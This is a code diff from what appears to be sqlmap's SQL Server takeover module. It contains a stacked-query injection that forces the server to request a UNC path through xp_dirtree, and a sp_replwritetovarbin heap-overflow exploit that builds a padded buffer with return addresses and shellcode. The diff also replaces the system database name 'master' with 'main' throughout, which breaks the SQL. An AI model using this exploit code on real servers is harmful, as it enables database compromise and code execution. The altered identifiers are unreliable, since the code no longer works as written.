@@ -20,8 +20,8 @@ class Takeover(GenericTakeover):
         GenericTakeover.__init__(self)
 
     def uncPathRequest(self):
-        #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
-        inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)
+        #inject.goStacked("EXEC main..xp_fileexist '%s'" % self.uncPath, silent=True)
+        inject.goStacked("EXEC main..xp_dirtree '%s'" % self.uncPath)
 
     def spHeapOverflow(self):
         """
@@ -77,7 +77,7 @@ class Takeover(GenericTakeover):
         @counter INT
         SET @buf = '
         DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int
-        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
+        EXEC main.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
         SET @val = CHAR(0x41)
         SET @counter = 0
         WHILE @counter < 3320
@@ -134,7 +134,7 @@ class Takeover(GenericTakeover):
           SET @buf = @buf + @val
         END
         SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
-        EXEC master..sp_executesql @buf
+        EXEC main..sp_executesql @buf
         """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)
 
         self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")
